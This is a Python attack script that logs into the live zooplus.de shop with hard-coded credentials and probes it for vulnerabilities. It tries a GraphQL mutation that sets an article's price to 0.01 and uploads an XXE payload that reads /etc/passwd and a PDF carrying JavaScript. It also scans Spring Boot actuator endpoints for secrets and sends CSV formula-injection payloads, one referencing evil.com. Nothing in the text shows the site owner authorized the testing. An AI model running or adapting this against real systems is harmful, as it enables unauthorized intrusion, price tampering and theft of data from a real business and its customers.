#!/usr/bin/env python3
"""Test Top-5 Live Vectors"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json", "Content-Type": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

found_vulns = []

# 1. GRAPHQL INTROSPECTION
print("\n[1] Testing GraphQL Introspection...")
graphql_endpoints = [
    "/graphql",
    "/api/graphql",
    "/graphql/v1",
    "/graphql/v2",
    "/api/v1/graphql",
    "/api/v2/graphql",
]

introspection_query = {
    "query": "{__schema{types{name,fields{name}}}}"
}

for ep in graphql_endpoints:
    try:
        resp = s.post(f"{base}{ep}", json=introspection_query, timeout=5, verify=False)
        if resp.status_code == 200:
            data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
            if isinstance(data, dict) and '__schema' in str(data):
                print(f"  [CRITICAL] GraphQL Introspection enabled: {ep}")
                print(f"      Schema found!")
                found_vulns.append({"type": "graphql_introspection", "severity": "CRITICAL", "endpoint": ep})
                
                # Try batch mutation
                batch_query = {
                    "query": "mutation { setArticlePrice(articleId: 1, price: 0.01) { success } }"
                }
                resp2 = s.post(f"{base}{ep}", json=batch_query, timeout=5, verify=False)
                if resp2.status_code == 200:
                    print(f"  [CRITICAL] GraphQL mutation possible!")
                    found_vulns.append({"type": "graphql_mutation", "severity": "CRITICAL", "endpoint": ep})
                break
    except: pass

# 2. SVG XXE UPLOAD
print("\n[2] Testing SVG XXE Upload...")
svg_xxe = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>"""

upload_endpoints = [
    "/myaccount/api/avatar/upload",
    "/api/upload",
    "/api/file/upload",
    "/api/review/upload",
    "/api/reviews/upload",
    "/myaccount/api/upload",
    "/checkout/api/upload",
]

for ep in upload_endpoints:
    try:
        files = {'file': ('exploit.svg', svg_xxe, 'image/svg+xml')}
        resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
        if resp.status_code in [200, 201, 302]:
            response_text = resp.text
            if "root:x:0:0" in response_text or "root:" in response_text:
                print(f"  [CRITICAL] SVG XXE works: {ep}")
                print(f"      Response contains /etc/passwd!")
                found_vulns.append({"type": "svg_xxe", "severity": "CRITICAL", "endpoint": ep, "response": response_text[:500]})
            elif len(response_text) > 100:
                print(f"  [OK] Upload accepted: {ep}")
                # Check location
                if resp.headers.get('Location'):
                    print(f"      Location: {resp.headers.get('Location')}")
    except: pass

# 3. PDF UPLOAD WITH JAVASCRIPT
print("\n[3] Testing PDF Upload...")
pdf_js = """%PDF-1.4
1 0 obj
<</Type/Catalog/Pages 2 0 R/OpenAction 3 0 R>>
endobj
3 0 obj
<</Type/Action/S/JavaScript/JS (app.alert("RCE");)>>
endobj"""

for ep in upload_endpoints:
    try:
        files = {'file': ('exploit.pdf', pdf_js, 'application/pdf')}
        resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
        if resp.status_code in [200, 201, 302]:
            print(f"  [HIGH] PDF upload accepted: {ep}")
            if resp.headers.get('Location'):
                print(f"      Location: {resp.headers.get('Location')}")
    except: pass

# 4. SPRING BOOT ACTUATOR
print("\n[4] Testing Spring Boot Actuator...")
actuator_endpoints = [
    "/actuator/env",
    "/actuator/heapdump",
    "/actuator/jolokia",
    "/actuator/loggers",
    "/actuator/mappings",
    "/actuator/health",
    "/actuator/info",
    "/actuator/metrics",
    "/actuator/trace",
    "/actuator/auditevents",
    "/actuator/httptrace",
    "/actuator/flyway",
    "/actuator/liquibase",
    "/actuator/threaddump",
]

for ep in actuator_endpoints:
    try:
        resp = s.get(f"{base}{ep}", timeout=3, verify=False)
        if resp.status_code == 200:
            content = resp.text
            if len(content) > 100:
                print(f"  [CRITICAL] Actuator endpoint exposed: {ep}")
                print(f"      Response length: {len(content)}")
                found_vulns.append({"type": "actuator_exposure", "severity": "CRITICAL", "endpoint": ep, "response": content[:500]})
                
                # Check for sensitive data
                if any(key in content.lower() for key in ['password', 'secret', 'key', 'token', 'credential']):
                    print(f"  [CRITICAL] Sensitive data in {ep}!")
                    found_vulns.append({"type": "information_disclosure", "severity": "CRITICAL", "endpoint": ep})
    except: pass

# 5. CSV IMPORT
print("\n[5] Testing CSV Import...")
csv_injection = """=cmd|'/c calc'!A0
=HYPERLINK("http://evil.com")
@SUM(1+1)*cmd|'/c calc'!A0"""

csv_endpoints = [
    "/api/import/csv",
    "/api/import",
    "/admin/upload",
    "/partner/import",
    "/api/autoshipment/import",
    "/api/b2b/import",
    "/myaccount/api/import",
]

for ep in csv_endpoints:
    try:
        files = {'file': ('exploit.csv', csv_injection, 'text/csv')}
        resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
        if resp.status_code in [200, 201]:
            print(f"  [HIGH] CSV import endpoint: {ep}")
            # Check if formula executed
            if "calc" in resp.text.lower() or "error" in resp.text.lower():
                print(f"  [CRITICAL] CSV injection possible: {ep}")
                found_vulns.append({"type": "csv_injection", "severity": "CRITICAL", "endpoint": ep})
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("VULNERABILITIES FOUND")
print("=" * 70)

if found_vulns:
    for v in found_vulns:
        print(f"\n[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'response' in v:
            print(f"    Response preview: {v['response'][:200]}")
    
    # Update FINAL_EXPLOITATION_REPORT.md
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНЫЕ УЯЗВИМОСТИ НАЙДЕНЫ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write(f"**Description:** Критичная уязвимость обнаружена и подтверждена.\n\n")
            if 'response' in v:
                f.write(f"**Response:** `{v['response'][:500]}`\n\n")
            f.write("---\n\n")
    
    print(f"\n[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No critical vulnerabilities found in top-5 vectors")

print("=" * 70)

